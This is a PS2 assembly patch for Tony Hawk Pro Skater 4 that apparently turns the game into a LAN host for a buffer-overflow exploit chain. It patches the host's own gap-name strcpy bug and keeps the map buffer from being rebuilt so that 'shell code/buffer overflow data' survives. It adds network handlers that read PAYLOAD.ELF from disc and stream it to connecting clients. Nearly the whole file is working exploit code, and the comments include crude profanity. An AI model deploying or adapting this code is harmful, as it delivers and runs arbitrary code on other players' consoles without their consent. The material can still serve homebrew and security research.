
# Must be applied to:
#   SLUS_205.04     Tony Hawk Pro Skater 4 (NTSC)
#   SHA1: F5D5E5A93CD90180FE8D87D4A945557DE3F82B1B
#
# To compile patches:
#
#   mips64r5900el-ps2-elf-as TonyHawkProSkater4-Lan-Host-NTSC.s -o TonyHawkProSkater4-Lan-Host-NTSC.elf
#   mips64r5900el-ps2-elf-objcopy -j .text TonyHawkProSkater4-Lan-Host-NTSC.elf -O binary TonyHawkProSkater4-Lan-Host-NTSC.bin
#
# To prep elf file:
#
#   1. Add new code segment (.hacks) and set section properties:
#       mips64r5900el-ps2-elf-objcopy --add-section .hacks=TonyHawkProSkater4-Lan-Host-NTSC.bin --set-section-flags .hacks=alloc,code SLUS_205.04 SLUS_205.04_mod
#       mips64r5900el-ps2-elf-objcopy --adjust-section-vma .hacks=$((16#FF000)) SLUS_205.04_mod SLUS_205.04_mod
#       mips64r5900el-ps2-elf-objcopy --set-section-alignment .hacks=16 SLUS_205.04_mod SLUS_205.04_mod
#

# General notes:
#
#   1. Do not use the branch delay slot for part of address calculation used in the branch target. Ex don't do this:
#
#       lui     $a0, XXXX
#       jr      $a0
#       ori     $a0, $a0, XXXX
#
#   2. Do not JAL to a local label from within the .hacks segment. This works just fine on x86 because the assembler can calculate a relative
#       jump. But unlike x86 we're using a shitty GCC assembler that sucks fat cock and can't calculate relative branches. So we have to load
#       the full branch address into a register and call that way.

#.set noat
.set noreorder

# We can't use T0-$t3 because this bullshit assembler will change them to use $t4+. I can't seem to find any command line option or preprocessor
# flag to disable this (fucking GNU bullshit...), so instead we macro the symbolic names to the register numbers. What a time to be alive...
.set T0,                $8
.set T1,                $9
.set T2,                $10
.set T3,                $11

.set HacksSegmentAddress,       0x000ff000      # Address of the .hacks segment
.set HacksSegmentSize,          0x1000          # Size of the .hacks segment

.macro HACK_FUNCTION sym
    .set \sym,      HacksSegmentAddress + (_\sym - _hacks_code_start)
.endm

.macro HACK_DATA sym
    .set \sym,      HacksSegmentAddress + (_\sym - _hacks_code_start)
.endm

# Function and data addresses:
.set printf,                    0x002B24E0
.set strncpy,                   0x002AD130
.set malloc,                    0x00112C40
.set free,                      0x00112D28      # I don't know if these malloc/free functions are real or custom...

.set Net__Dispatcher__AddHandler,       0x00199AA8
.set Net__Server__StreamMessage,        0x0019DB10

# FileIo function addresses:
.set sceOpen,                   0x0029DB60
.set sceLSeek,                  0x0029DF68
.set sceRead,                   0x0029E1A0
.set sceClose,                  0x0029DDE8


# Compiler options:
.set STRCPY_FIX,                    1   # Enables or disables the strcpy bug fix (payload will run on host)
.set DEBUG_PRINT,                   1   # Enables debug message printing


# Function and data addresses in the .hacks code segment:
HACK_FUNCTION Hack_LoadParkDetour
HACK_FUNCTION Hack_SpawnServerDetour
HACK_FUNCTION Hack_LoadPayload
HACK_FUNCTION Hack_s_handle_payload_request
HACK_FUNCTION Hack_s_handle_payload_data
HACK_FUNCTION Hack_DisplayErrorFatal

HACK_DATA Hack_PayloadFileName
HACK_DATA Hack_PayloadPtr
HACK_DATA Hack_PayloadSize
HACK_DATA Hack_PayloadMsgDescription

.if DEBUG_PRINT == 1

HACK_DATA Hack_FailedToOpenPayload
HACK_DATA Hack_FailedToAllocateMemory
HACK_DATA Hack_PayloadLoadedSuccessfully

.endif

# Structure of our network payload messages:
#
# struct PayloadData
# {
#       DWORD Id;           // Message ID
#       DWORD Value;        // optional value, can be file size or offset of data depending on the message
# };

# Custom message IDs:
.set MSG_ID_PAYLOAD_REQUEST,        200
.set MSG_ID_PAYLOAD_DATA,           201

.set PAYLOAD_MSG_ID_START,          0   # Value = size of the file
.set PAYLOAD_MSG_ID_DATA,           1   # C->H: Value = offset of data H->C Value = size of data
.set PAYLOAD_MSG_ID_END,            2   # Value = size of data


.set GS_COLOR_RED,                  0x000000FF      # Failed to open payload.elf file
.set GS_COLOR_BLUE,                 0x0000FF00
.set GS_COLOR_GREEN,                0x00FF0000
.set GS_COLOR_CYAN,                 0x00FFFF00      # Failed to allocate memory when reading payload.elf
.set GS_COLOR_YELLOW,               0x0000FFFF      # Failed to allocate memory when sending payload.elf


#---------------------------------------------------------
# Re-enable EE uart debug output
#---------------------------------------------------------
.word   printf + 0x20
.word   (_printf_enable1_end - _printf_enable1_start)

_printf_enable1_start:

        # Skip overwriting the putc function pointers.
        nop

_printf_enable1_end:

.word   printf + 0x48
.word   (_printf_enable2_end - _printf_enable2_start)

_printf_enable2_start:

        # Skip overwriting the putc function pointers.
        nop

_printf_enable2_end:

.if STRCPY_FIX == 1

#---------------------------------------------------------
# Load park hook
#---------------------------------------------------------
.word   0x00253848
.word   (_load_park_hook_end - _load_park_hook_start)

_load_park_hook_start:

        # Hook and jump to our code cave.
        lui     $a0, ((Hack_LoadParkDetour >> 16) & 0xFFFF)
        ori     $a0, $a0, (Hack_LoadParkDetour & 0xFFFF)
        jr      $a0
        nop

_load_park_hook_end:

.endif

#---------------------------------------------------------
# Stop compressed map buffer from being re-built
#---------------------------------------------------------
.word   0x00234174
.word   (write_map_buffer_end - write_map_buffer_start)

write_map_buffer_start:

        # NOP the function call to CParkManager::WriteCompressedMapBuffer, this stops
        # the map buffer from being rewritten and trashing our shell code/buffer overflow data.
        nop
        nop

write_map_buffer_end:

#---------------------------------------------------------
# Manager::SpawnServer() -> hook so we can add our custom message handlers
#---------------------------------------------------------
.word   0x00235BEC
.word   (_spawn_server_hook_end - _spawn_server_hook_start)

_spawn_server_hook_start:

        # Hook to our code cave so we can add our custom message type handlers.
        lui     $a0, ((Hack_SpawnServerDetour >> 16) & 0xFFFF)
        ori     $a0, $a0, (Hack_SpawnServerDetour & 0xFFFF)
        jr      $a0
        nop

_spawn_server_hook_end:

#---------------------------------------------------------
# .hacks code segment
#---------------------------------------------------------
.word   HacksSegmentAddress
.word   (_hacks_code_end - _hacks_code_start)

_hacks_code_start:

    #---------------------------------------------------------
    # Code cave for gap name strcpy bug fix
    #---------------------------------------------------------
_Hack_LoadParkDetour:

        # Call strncpy to copy the gap name so we don't overflow the stack.
        la      T0, strncpy
        lw      $a1, 0x90($sp)          # dst = address of gap name in park file
        lw      $a0, 0x80($sp)          # src = address of gap name buffer on stack
        jalr    T0
        li      $a3, 30                 # Copy 30 characters at most (leaving one for null terminator)
        
        # Null terminate the string.
        lw      $a0, 0x80($sp)
        sb      $zero, 31($a0)
        
        # Return to load park function.
        la      $a0, 0x00253854
        jr      $a0
        lhu     $v1, 0x2A($s2)
        
    #---------------------------------------------------------
    # Hook to add our custom message type handlers
    #---------------------------------------------------------
_Hack_SpawnServerDetour:

        # Load the payload file into memory.
        la      T0, Hack_LoadPayload
        jalr    T0
        nop
        
        # Add custom handler for MSG_ID_PAYLOAD_REQUEST.
        li      T1, 255                             # HIGHEST_PRIORITY
        move    T0, $s3                             # Net::Manager*
        move    $a3, $zero                          # Flags
        la      $a2, Hack_s_handle_payload_request  # Handler function
        li      $a1, MSG_ID_PAYLOAD_REQUEST         # Message ID
        lw      $a0, 0x10($s3)
        addiu   $a0, 4                              # this ptr
        la      $v0, Net__Dispatcher__AddHandler
        jalr    $v0
        nop
        
        # Add custom handler for MSG_ID_PAYLOAD_DATA.
        li      T1, 255                             # HIGHEST_PRIORITY
        move    T0, $s3                             # Net::Manager*
        move    $a3, $zero                          # Flags
        la      $a2, Hack_s_handle_payload_data     # Handler function
        li      $a1, MSG_ID_PAYLOAD_DATA            # Message ID
        lw      $a0, 0x10($s3)
        addiu   $a0, 4                              # this ptr
        la      $v0, Net__Dispatcher__AddHandler
        jalr    $v0
        nop

        # Replace instructions we overwrote.
        sw      $zero, 0x160($s3)
        la      T0, 0x239920
        jalr    T0
        move    $a0, $s3
        lw      $v0, 0x10($s3)
        
        # Return back to the original function.
        la      $a0, 0x00235BFC
        jr      $a0
        nop

    #---------------------------------------------------------
    # bool Hack_LoadPayload() -> Loads the payload into memory for easy access
    #---------------------------------------------------------
_Hack_LoadPayload:

        .set StackSize,         0x34
        .set Result,            -0x34
        .set s_s1,              -0x30
        .set s_s0,              -0x20
        .set s_ra,              -0x10
        
        # Setup stack frame.
        addiu   $sp, -StackSize
        sd      $s1, StackSize+s_s1($sp)
        sd      $s0, StackSize+s_s0($sp)
        sd      $ra, StackSize+s_ra($sp)
        
        sw      $zero, StackSize+Result($sp)
        
        # Check if the payload has already been loaded into memory.
        lw      T0, Hack_PayloadPtr
        bnez    T0, _Hack_LoadPayload_Success
        nop
        
        # Try to open the file for reading.
        la      $a0, Hack_PayloadFileName
        la      T0, sceOpen
        jalr    T0
        li      $a1, 1                  # FIO_O_RDONLY
        bgez    $v0, _Hack_LoadPayload_Size
        move    $s0, $v0                                # fd
        
.if DEBUG_PRINT == 1
            # Failed to open the payload file.
            la      T0, printf
            move    $a1, $v0
            la      $a0, Hack_FailedToOpenPayload
            jalr    T0
            nop
.endif

            # Set screen color.
            la      $a0, GS_COLOR_RED
            la      T0, Hack_DisplayErrorFatal
            jalr    T0
            nop
        
_Hack_LoadPayload_Size:

        # Get the size of the payload file.
        move    $a1, $zero              # offset
        move    $a0, $s0                # fd
        la      T0, sceLSeek
        jalr    T0
        li      $a2, 2                  # FIO_SEEK_END
        
        # Save the payload size.
        sw      $v0, Hack_PayloadSize   # fileSize
        
        # Allocate a buffer to hold the payload.
        la      T0, malloc
        jalr    T0
        move    $a0, $v0
        sw      $v0, Hack_PayloadPtr
        bnez    $v0, _Hack_LoadPayload_Read
        nop
        
.if DEBUG_PRINT == 1
            # Failed to allocate memory for payload file.
            lw      $a1, Hack_PayloadSize
            la      $a0, Hack_FailedToAllocateMemory
            la      T0, printf
            jalr    T0
            nop
.endif

            # Set screen color.
            la      $a0, GS_COLOR_CYAN
            la      T0, Hack_DisplayErrorFatal
            jalr    T0
            nop
        
_Hack_LoadPayload_Read:

        # Seek to the start of the file.
        move    $a1, $zero              # offset
        move    $a0, $s0                # fd
        la      T0, sceLSeek
        jalr    T0
        move    $a2, $zero              # FIO_SEEK_BEGIN

        # Read the payload into memory.
        lw      $a2, Hack_PayloadSize   # read size
        lw      $a1, Hack_PayloadPtr    # buffer
        la      T0, sceRead
        jalr    T0
        move    $a0, $s0                # fd
        
        # TODO: should probably check the file read successfully
        
        # Close the file handle.
        la      T0, sceClose
        jalr    T0
        move    $a0, $s0
        
_Hack_LoadPayload_Success:

.if DEBUG_PRINT == 1
        # Debug print message.
        lw      $a1, Hack_PayloadSize
        la      $a0, Hack_PayloadLoadedSuccessfully
        la      T0, printf
        jalr    T0
        nop
.endif

        # Successfully loaded the payload.
        li      $v0, 1
        sw      $v0, StackSize+Result($sp)

_Hack_LoadPayload_Done:
        
        # Destroy stack frame and return.
        lw      $v0, StackSize+Result($sp)
        ld      $ra, StackSize+s_ra($sp)
        ld      $s0, StackSize+s_s0($sp)
        ld      $s1, StackSize+s_s1($sp)
        jr      $ra
        addiu   $sp, StackSize

    #---------------------------------------------------------
    # int __cdecl Hack_s_handle_payload_request(Net::MsgHandlerContext* context) -> Message handler for MSG_ID_PAYLOAD_REQUEST
    #---------------------------------------------------------
_Hack_s_handle_payload_request:

        .set StackSize,             0x28
        .set Msg_Id,                -0x28
        .set Msg_Value,             -0x24
        .set s_s0,                  -0x20
        .set s_ra,                  -0x10
        
        # Setup stack frame.
        addiu   $sp, -StackSize
        sd      $ra, StackSize+s_ra($sp)
        sd      $s0, StackSize+s_s0($sp)
        
        move    $s0, $a0                            # context
        
        # Setup the message header.
        li      T0, PAYLOAD_MSG_ID_START
        sw      T0, StackSize+Msg_Id($sp)           # pMsg->Id = PAYLOAD_MSG_ID_START
        lw      T0, Hack_PayloadSize
        sw      T0, StackSize+Msg_Value($sp)        # pMsg->Value = Hack_PayloadSize
        
        # Get the server instance from the context parameter.
        lw      $a0, 0x4004($s0)                    # server = context->m_App
        
        # Get the connection handle.
        lw      $v0, 0x4008($s0)
        lw      $a1, 0x48($v0)                      # connHandle = context->m_Conn->GetHandle()
        
        # Send the payload to the client.
        li      T2, 8                               # vSEQ_GROUP_PLAYER_MSGS
        la      T1, Hack_PayloadMsgDescription      # 'payload'
        addiu   T0, $sp, StackSize+Msg_Id           # &Msg
        li      $a3, 8                              # sizeof(PayloadData)
        li      $a2, MSG_ID_PAYLOAD_DATA            # Message ID
        la      $v0, Net__Server__StreamMessage
        jalr    $v0
        nop
        
        # Cleanup stack frame and return.
        li      $v0, 1              # return HANDLER_CONTINUE
        ld      $s0, StackSize+s_s0($sp)
        ld      $ra, StackSize+s_ra($sp)
        jr      $ra
        addiu   $sp, StackSize

    #---------------------------------------------------------
    # int __cdecl Hack_s_handle_payload_data(Net::MsgHandlerContext* context) -> Message handler for MSG_ID_PAYLOAD_DATA
    #---------------------------------------------------------
_Hack_s_handle_payload_data:

        .set StackSize,             0x30
        .set s_s1,                  -0x30
        .set s_s0,                  -0x20
        .set s_ra,                  -0x10
        
        # Setup stack frame.
        addiu   $sp, -StackSize
        sd      $ra, StackSize+s_ra($sp)
        sd      $s0, StackSize+s_s0($sp)
        sd      $s1, StackSize+s_s1($sp)
        
        move    $s0, $a0                            # context
        
        # Check the message type and handle accordingly.
        lw      T0, 0($s0)                          # context->Id
        li      T1, PAYLOAD_MSG_ID_DATA
        bne     T0, T1, _Hack_s_handle_payload_data_done        # if (context->Id != PAYLOAD_MSG_ID_DATA)
        
        # Allocate a buffer for the message data.
        li      $a0, 15000+8
        la      T0, malloc
        jalr    T0
        nop
        move    $s1, $v0
        bnez    $s1, _Hack_s_handle_payload_data_setup
        
.if DEBUG_PRINT == 1
            # Failed to allocate memory for payload file.
            move    $a1, $s1
            la      $a0, Hack_FailedToAllocateMemory
            la      T0, printf
            jalr    T0
            nop
.endif

            # Set screen color.
            la      $a0, GS_COLOR_YELLOW
            la      T0, Hack_DisplayErrorFatal
            jalr    T0
            nop
        
_Hack_s_handle_payload_data_setup:

        # Setup the message header.
        li      T0, PAYLOAD_MSG_ID_DATA
        sw      T0, 0($s1)                          # pMsg->Id = PAYLOAD_MSG_ID_DATA
        li      T0, 15000
        sw      T0, 4($s1)                          # pMsg->Value = chunk size
        
        # Calculate the chunk size of the payload.
        lw      T0, 4($s0)                          # context->Value
        addiu   T0, 15000
        lw      T1, Hack_PayloadSize                                # if (context->Value + 15000 > Hack_PayloadSize)
        ble     T0, T1, _Hack_s_handle_payload_data_continue
        nop
        
            # Last chunk for the payload.
            li      T0, PAYLOAD_MSG_ID_END
            sw      T0, 0($s1)                      # pMsg->Id = PAYLOAD_MSG_ID_END
            lw      T0, 4($s0)                      # context->Value
            sub     T0, T1, T0                      # remainingSize = Hack_PayloadSize - context->Value
            sw      T0, 4($s1)                      # pMsg->Value = remainingSize
        
_Hack_s_handle_payload_data_continue:

        # Copy the next chunk of the payload to the message buffer.
        lw      T2, Hack_PayloadPtr
        lw      T0, 4($s0)
        add     $a0, T2, T0                         # pSrc = Hack_PayloadPtr + context->Value (offset)
        addiu   $a1, $s1, 8                         # pDst = pMsg + sizeof(PayloadData)
        lw      $a2, 4($s1)                         # size = pMsg->Value
        
        move    T1, $zero                           # i = 0
        
0:
        lb      T0, 0($a0)
        sb      T0, 0($a1)                          # *pDst++ = *pSrc++
        addiu   $a0, $a0, 1
        addiu   $a1, $a1, 1
        addiu   T1, T1, 1                           # i++
        bne     T1, $a2, 0b                         # while (i < size);
        nop
        
        # Get the server instance from the context parameter.
        lw      $a0, 0x4004($s0)                    # server = context->m_App
        
        # Get the connection handle.
        lw      $v0, 0x4008($s0)
        lw      $a1, 0x48($v0)                      # connHandle = context->m_Conn->GetHandle()
        
        # Send the payload to the client.
        li      T2, 8                               # vSEQ_GROUP_PLAYER_MSGS
        la      T1, Hack_PayloadMsgDescription      # 'payload'
        move    T0, $s1                             # &Msg
        li      $a3, 15000+8                        # sizeof(PayloadData) + 15000
        li      $a2, MSG_ID_PAYLOAD_DATA            # Message ID
        la      $v0, Net__Server__StreamMessage
        jalr    $v0
        nop
        
        # Free the message buffer we allocated
        move    $a0, $s1
        la      T0, free
        jalr    T0
        nop
        
_Hack_s_handle_payload_data_done:

        # Cleanup stack frame and return.
        li      $v0, 1              # return HANDLER_CONTINUE
        ld      $s1, StackSize+s_s1($sp)
        ld      $s0, StackSize+s_s0($sp)
        ld      $ra, StackSize+s_ra($sp)
        jr      $ra
        addiu   $sp, StackSize

    #---------------------------------------------------------
    # void Hack_DisplayErrorFatal(int color) -> Changes the screen color and loops indefinitely
    #---------------------------------------------------------
_Hack_DisplayErrorFatal:

        # Set GS screen color.
        la      $s0, 0x120000E0
        sw      $a0, 0($s0)
        
_Hack_DisplayErrorFatal_loop:
        b       _Hack_DisplayErrorFatal_loop
        nop

    #-----------------------------------------------------------------------------------------------------
    # Nop sled to force cpu cache to not interpret data as code.
    nop
    nop
    nop
    nop
    nop
        
_Hack_PayloadFileName:
        .asciiz "cdrom0:\\PAYLOAD.ELF;1"
        
_Hack_PayloadPtr:
        .word 0
        
_Hack_PayloadSize:
        .word 0
        
_Hack_PayloadMsgDescription:
        .asciiz "payload"

.if DEBUG_PRINT == 1

_Hack_FailedToOpenPayload:
        .asciiz "Failed to open payload.elf %d\n"
        
_Hack_FailedToAllocateMemory:
        .asciiz "Failed to allocate %d bytes of memory for payload\n"
        
_Hack_PayloadLoadedSuccessfully:
        .asciiz "Successfully loaded payload of size %d\n"

.endif

_hacks_code_end:

.word 0xFFFFFFFF


